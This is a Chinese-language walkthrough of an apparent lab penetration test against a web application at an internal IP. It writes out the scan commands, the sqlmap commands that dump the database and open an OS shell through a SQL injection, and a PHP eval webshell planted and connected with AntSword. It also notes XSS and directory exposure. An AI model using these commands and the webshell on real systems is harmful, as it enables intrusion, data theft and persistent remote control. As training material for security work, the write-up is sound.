首先拿到内网ip：10.7.11.83，并没有给端口，于是我们先用fscan扫描端口

./fscan -h 10.7.11.83 -p 1-30000

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/745b9537080b.webp)

访问http://10.7.11.83:20048进入网站

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/28a4dbc7b290.webp)

打开网站

利用xray进行被动扫描

xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output result.html

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a643c2b0adb8.webp)

配置浏览器代理

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9a5d7400cf29.png)

扫描结束之后，分析报告

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bdb02804ba58.webp)

发现目标网站的 `keywords` GET 参数存在 **SQL 注入漏洞，还可能存在 XSS（跨站脚本）漏洞**

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/926965d9b756.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6ba51a8f7545.webp)

先拿去sqlmap进行自动化注入测试

测试注入点

sqlmap -u " http://10.7.11.83:20048/index.php?r=default%2Findex%2Fsearch&keywords=1%C2%B711&type=all" --batch

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/417b2754ed43.webp)

目标网站的 `keywords` GET 参数存在 **SQL 注入漏洞**，且是 MySQL 数据库下的多种注入类型。例如，布尔盲注、报错注入、时间盲注等。

添加--dump参数进行脱库

sqlmap -u " http://10.7.11.83:20048/index.php?r=default%2Findex%2Fsearch&keywords=1%C2%B711&type=all" --batch --dump

查看结果，发现敏感字段，username、password尝试用来登录

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7eb1d1f03a44.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0ff4468f71a4.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ff39ce0fb2cb.png)

发现用户名或密码错误，可能是默认口令已经被修改

于是我们直接尝试利用注入点getshell

sqlmap -u "http://10.7.11.83:20048/index.php?r=default%2Findex%2Fsearch&keywords=11&type=all" --os-shell --batch

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6eb1bf4f4219.webp)

查看当前网站目录

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/40a52718b975.webp)

直接在当前目录下创建木马

echo '<?php @eval($_POST["pass"]);?>' > shell.php

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/8b7b44364223.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a61bb10dde0d.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/87675de53578.webp)

发现能够执行命令

直接使用蚁剑进行连接

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5ba185fb21a9.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4dd401a69101.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/d8a7a1c48104.webp)

连接成功

其他漏洞测试：

①xss漏洞

在搜索栏输入 XSS 测试代码

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7a870388b91c.png)

发现搜索栏并未进行过滤验证，直接执行了xss代码证明该网站存在xss漏洞

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6f24d2990a8f.webp)

②目录遍历（路径穿越）漏洞

用dirsearch扫一下，会发现网站的路径都能直接访问

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7227e41b5401.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9c8b1d4270e1.webp)
